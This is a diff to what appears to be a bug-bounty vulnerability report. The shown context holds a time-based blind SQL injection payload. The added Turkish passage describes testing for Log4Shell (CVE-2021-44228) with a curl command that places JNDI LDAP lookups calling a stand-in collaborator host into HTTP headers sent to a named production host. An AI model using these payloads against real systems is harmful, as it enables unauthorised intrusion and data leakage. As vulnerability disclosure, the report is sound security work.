@@ -91,3 +91,40 @@ CVE Numbers
 Steps to Reproduce
 ```https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896```
 Suggested Mitigation/Remediation Actions
+
+___________________________________
+
+
+______________________________________
+
+
+Bir gün, uygulamanın içinde bir güvenlik açığı olduğunu fark ettim. Bu güvenlik açığı, internette "Log4Shell" olarak bilinen ve ciddi bir tehdit oluşturan bir problem. Log4j adlı bir yazılım kütüphanesi, internetten gelen verileri işlerken bazı hatalar yapıyor ve bu hatalar, kötü niyetli bir kişinin uzaktan, sanki bilgisayarın başında oturuyormuş gibi komutlar çalıştırmasına olanak tanıyor. Bu problem "CVE-2021-44228" koduyla tanımlanmış.
+
+Neler Yaptım:
+
+Bu açığı test etmek için bir yöntem buldum. Bu yöntemde Burp Collaborator adlı bir aracı kullandım. Bu araç, uygulamanın internet üzerinden verdiği tepkileri izlememi sağlıyor.
+
+İlk olarak, bu aracı kullanarak bir komut oluşturdum. Bu komut, belirli bir internet adresine (COLLABORATOR_URL) bir istek gönderiyor. Komutu şu şekilde yazdım:
+
+bash
+Kodu kopyala
+curl --http1.1 --silent --output /dev/null \
+--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+https://ng01-cloud.acronis.com
+Bu Komut Ne Yapar?
+
+Bu komut, belirli başlıklar (User-agent, X-Forwarded-For, Referer) kullanarak uygulamaya istek gönderiyor. Başlıkların içindeki ${jndi:ldap://...} kısmı ise, uygulamanın içindeki Log4j kütüphanesine "Bir internet adresine git ve oradan bazı bilgiler al" diyor.
+
+Eğer bu açığın olduğu bir uygulamaya bu komutu gönderirseniz, Log4j kütüphanesi bu isteği işlerken benim belirttiğim internet adresine bir bağlantı yapmaya çalışıyor. Bu bağlantı başarılı olursa, bu uygulamanın zafiyeti olduğunu kanıtlamış oluyorum.
+
+Sonuç:
+
+Uygulama bana kendi sistem adını (hostname) gönderdi. Bu, uygulamanın dışarıdan gelen bu tehlikeli isteği işlediğini ve sonuç olarak sistemde uzaktan komut çalıştırmanın mümkün olduğunu gösterdi.
+
+Etkisi:
+
+Bu açıktan faydalanan kötü niyetli biri, uygulamaya uzaktan komutlar gönderip, bu komutları sistem üzerinde çalıştırabilir. Bu, sistemin tamamen ele geçirilmesine kadar varabilecek ciddi güvenlik riskleri oluşturur.
+
+
